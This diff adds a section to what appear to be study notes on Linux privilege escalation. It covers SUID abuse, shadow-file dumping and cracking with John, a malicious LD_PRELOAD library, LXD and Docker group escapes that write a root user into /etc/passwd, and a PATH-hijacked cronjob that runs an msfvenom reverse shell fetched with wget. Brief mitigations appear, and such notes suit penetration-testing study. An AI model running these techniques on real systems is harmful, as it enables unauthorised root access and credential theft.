@@ -247,6 +247,265 @@ sam      ALL=(ALL:ALL) NOPASSWD:ALL
 
 # After saving, verify sudo
 sudo id
-
 ```
+
+Another possibility is setting the SUID bit on something like `Python` or `Perl` which can be easily abused by running scripts. 
+
+```bash
+# Determine if Python has SUID
+find /usr/bin/* -user root -perm -4000 -print 2>/dev/null
+
+# Gain root
+/usr/bin/python3.9 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+
+Yet another possibility is a program like `Cat`. Cat is used for reading files, but in this case with SUID can be used to read and dump the contents of /etc/shadow which can then be brute forced by John or Hashcat.
+
+```bash
+sam:$6$.n:18941:0:99999:7::::
+# sam: = Username
+# :$6$.n: = Encrypted Password
+# :18941: = Last password change
+# :0: = Minimum password age
+# :99999: = Max password age
+# :7: Warning Period
+# :: Inactivity Period
+# :: Expiration Date
+# : Unused
+```
+
+So what can we do?
+First create two files from `/etc/passwd` and `/etc/shadow`. 
+
+```bash
+cat /etc/passwd | grep -E "root:x:|sam:x:" > passwd.txt
+cat /etc/shadow | grep -E "root:|sam:" > shadow.txt
+```
+
+Next unshadow the files to combine them, so they are in a format `John` can utilize.
+
+```bash
+unshadow passwd.txt shadow.txt > unshadowed.txt
+```
+
+Lastly, we can crack the entries:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+```
+
+## Exploiting SGID 
+
+`SGID` is similar, except it applies to groups. 
+https://www.redhat.com/sysadmin/suid-sgid-sticky-bit
+
+```bash
+find / -type d -perm -02000
+```
+
+### Mitigation
+
+You should check regularly for SUID binaries, in particular 3rd party binaries with command execution, and application that don't need it. SUID is pretty pervesaive, and can be hard to discover. A netcat reverse shell with SUID would run as root by default. 
+
+## LD_PRELOAD Privilege Escalation
+
+`LD_PRELOAD` is an optional environment variable of paths to libraries to load into memory before a program is run.  
+Many programs use shared libraries , and we can use the `ldd` tool to verify shared object dependencies. 
+The implications of this are if a binary executed with sudo or root permissions can pre-load a library with vulnerabilities with the same permissions (root). 
+
+### Sudo LD_PRELOAD 
+
+A privilege escalation vector to keep an eye out for: sudo can use LD_PRELOAD to load shared libraries. This flag is set and can be set in the `sudoers` file with the `env_keep+` flag. This can be verified with `sudo -l`.
+
+We can take advantage of this (mis)configuration by creating a malicious shared library.
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init()
+{
+  unsetenv("LD_PRELOAD");
+  setgid(0);
+  setuid(0);
+  system("/bin/sh");
+}
+```
+
+We can compile the library:
+
+```bash
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+
+The output file is named `shell.so` - once transferred, we can add the shared library file to the LD_PRELOAD environment variable with the following:
+```bash
+# We are running apache2 as the user `lucky` which has nopassword sudo permissions.
+# Consequently, we can pass the LD_PRELOAD var and sudo execute apache2 as root without a password.
+sudo LD_PRELOAD=/tmp/shell.so apache2
+```
+
+## LXD Privilege Escalation
+
+LXD is an open source container manager to build and manage Linux containers on a Linux host. LXD uses a container technology called LXC (Linux Containers) and uses a REST API that is accessible over both a UNIX socket locally, and over the network if enabled. The provided LXD client then communicates with the API for actions.
+
+> LXC = userspace interface with the Linux kernel containment features.
+> https://linuxcontainers.org/lxc/introduction
+>
+> LXD = Next Generation system container manager. 
+> https://linuxcontainers.org/lxd/introduction/
+
+Linux hosts running LXD might be vulnerable to privilege escalation.
+LXD is a root process that performs actions for anyone with write access to the LXD socket. Write access to the socket is provided through the `lxd` group. One example of compromise is to mount the root filesystem of the host container into a container. This permits a low level user direct access to the host root filesystem (such as `/etc`).
+
+### Walkthrough mounting root filesystem
+
+1. Verify the user is in the `lxd` group
+
+2. Download and build latest Alpine Linux
+
+3. Transfer the tarball to the host
+
+4. Import the image on the target, assign privileges, mount the disk
+
+5. Spawn a shell and access the filesystem
+
+   ```bash
+   # Confirm the user is in the lxd group
+   id
+   # Clone the LXD Alpine Repo
+   git clone https://github.com/saghul/lxd-alpine-builder.git
+   cd lxd-alpine-builder
+   # Build the image
+   ./build-alpine
+   # Serve the image
+   python -m SimpleHTTPServer 80
+   -----
+   # Switch to the target host
+   ----- 
+   # Cd to a tmp
+   cd /tmp
+   # Download the tar
+   wget http://[host IP]/<tarball file>
+   # [Optional] it might be necessary to run lxc init
+   lxc init
+   # Import the image
+   lxc image import <image tarball> --alias myimage
+   # Verify the image was imported
+   lxc image list
+   # Assign permissions
+   lxc init myimage shell -c security.privileged=true
+   # Mount the host filesystem
+   lxc config device add shell mydevice disk source=/ path=/mnt/root recursive=true
+   # Start a shell
+   lxc start shell
+   # Verify the shell is running
+   lxc ls
+   # Exec into the shell
+   lxc exec shell /bin/sh
+   # Once in the shell, we have access to the host filesystem
+   cat /mnt/root/root/key.txt
+   ```
+
+   https://linuxcontainers.org/lxd/docs/master/security
+
+   https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071
+
+   Https://shenaniganslabs.io/2019/05/21/LXD-LPE.html
+
+   https://github.com/sgahul/lxd-alpine-builder
+
+### Docker Privilege Escalation
+
+Like `lxd`, a user with the `docker` group access, is equivalent to root access. It is possible to break out of a docker container, and gain root acess to the host. 
+https://www.docker.com/resources/what-container
+https://opensource.com/resources/what-docker
+https://gtfobins.github.io/gtfobins/docker
+
+```bash
+# Run a public docker image named ubuntu, and command uname -a
+docker run ubuntu uname -a
+
+# Get a shell
+docker <container> run -it ubuntu /bin/sh
+```
+
+So how do get privilege escalation?
+Let's start by mounting the host filesystem in the container:
+
+```bash
+# Mount the host /home directory to /mnt in the container
+docker run -v /home:/mnt -it ubuntu
+
+# Mount /etc to /mnt
+docker run -v /etc:/mnt -it ubuntu
+# Once mounted in the container shell, we can retrieve contents of passwd/shadow
+# We can also just add a new user to /etc/passwd:
+echo 'pom:poD7u2nSiBSLKL0:0:root:/root:/bin/bash' >> /etc/passwd
+# Exit the container
+exit
+# Switch to the pom user and verify identity
+su pom
+id
+```
+
+### Mitigating Docker Privilege Escalation
+
+Essentiallly, being a member of the Docker group is the equivalent of root. 
+An effective strategy then is to have the Docker daemon run containers in `rootless` mode. This allows containers to run as a non-root user to limit privilege escalation. 
+This executes Docker daemon and containers inside a user namespace, which separates user ID's and group ID's between the docker host and the containers, providing container isolation. 
+In practice, this means a privileged user in the container, is mapped to a non-privileged user on the host.
+https://docs.docker.com/engine.security/userns-remap/
+
+## Path Manipulation
+
+`PATH` is an environment variable which specifices where binaries / executable programs are located. This allows executing with solely a binary name, instead of a relative / fully qualified path. 
+On Linux this is viewable via:
+
+```bash
+echo $PATH
+```
+
+On Windows this is accessible via `Avanced System Settings -> System Properties -> Environment Variables`.
+
+The path can be updated to include new directories:
+```bash
+export PATH=$PATH:/home/kali
+```
+
+What's interesting about this however is now binaries in `/home/kali` can be access by calling their name. What if you are developing, and want to call the `local` implementation, not the one in /home/kali? 
+This could mean simply adding the `cwd` or `.` to the path, like `export PATH=$PATH:.`
+
+Lets look at a cronjob misconfiguration where we can take advantage of this fact.
+
+```bash
+# Runs a backup script every five minutes
+cat /etc/crontab
+SHELL=/bin/bash
+PATH=.:/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+*/5 * * * *    root      /usr/local/bin/backup.sh
+
+# The backup script:
+#!/bin/bash
+cd /var/www/html/administrator
+tar cf /var/backups/backuplogs.tgz logs
+```
+
+Because `$PATH` first includes the `.` it first check for the tar program in the current directory, which in the case of the script is the web root folder. This means we can put a malicious program named tar in the web root directory, which the cronjob will execute as root.
+
+```bash
+# Let's create a reverse shell payload _named_ tar
+msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp LHOST=172.16.1.1 LPORT=4443 -f elf-so -o tar
+# Use Wget to get it to the webroot
+python3 -m http.server 80
+----
+#Target
+----
+cd /var/www/html/administrator
+wget http://172.16.1.1/tar
+chmod +x tar
+```
+
+Once the cronjob runs, it will first execute the malicious tar payload, creating a reverse shell back to our host with root permissions. Win!
 
